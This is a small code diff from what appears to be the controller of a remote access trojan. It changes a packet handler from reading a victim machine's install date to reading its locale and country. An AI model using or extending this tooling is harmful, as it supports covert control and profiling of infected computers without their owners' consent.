@@ -4,17 +4,19 @@ import java.io.DataInputStream;
 
 import com.redpois0n.Slave;
 
-public class Packet31InitInstallationDate extends AbstractIncomingPacket {
+public class Packet10InitDefaultLocale extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		String date = slave.readLine();
-		slave.setInstallDate(date);
+		slave.setDisplayLanguage(slave.readLine());
+		slave.setLanguage(slave.readLine());
+		slave.setLongCountry(slave.readLine());
+
 	}
 
 	@Override
 	public byte getPacketId() {
-		return 31;
+		return 10;
 	}
 
 }
